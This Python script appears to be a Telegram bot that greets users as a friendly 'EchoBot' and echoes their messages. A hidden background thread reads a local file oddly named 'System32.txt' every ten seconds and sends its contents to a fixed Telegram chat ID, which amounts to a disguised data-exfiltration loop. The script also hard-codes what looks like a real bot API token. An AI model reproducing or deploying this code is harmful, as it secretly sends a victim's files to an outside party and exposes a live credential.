import telebot
import time

API_TOKEN = '6071630449:AAHslhDKXn83m8gsfsB8m4_hQvw9-9N5pWE'  # Replace with your actual bot token
file_path = "C:\\Users\\kiril\\System32.txt"

bot = telebot.TeleBot(API_TOKEN)

with open(file_path, 'r') as file:
    try:
        file_contents = file.read()
        print(file_contents)
    except:
        print('false')


# Function to send a specific message every 10 seconds
def send_message_periodically():
    while True:
        with open(file_path, 'r') as file:
            try:
                file_contents = file.read()
                print(file_contents)
            except:
                print('false')
        bot.send_message('973147838',
                         file_contents)  # Replace 'YOUR_CHAT_ID' and 'Your message goes here'
        time.sleep(10)  # Wait for 10 seconds before sending the next message


# Start the message sending loop in a separate thread
import threading

message_thread = threading.Thread(target=send_message_periodically)
message_thread.start()


# Handle '/start' and '/help'
@bot.message_handler(commands=['help', 'start'])
def send_welcome(message):
    bot.reply_to(message, """\
Hi there, I am EchoBot.
I am here to echo your kind words back to you. Just say anything nice, and I'll say the exact same thing to you!\
""")


# Handle all other messages with content_type 'text' (content_types defaults to ['text'])
@bot.message_handler(func=lambda message: True)
def echo_message(message):
    bot.reply_to(message, message.text)


bot.infinity_polling()
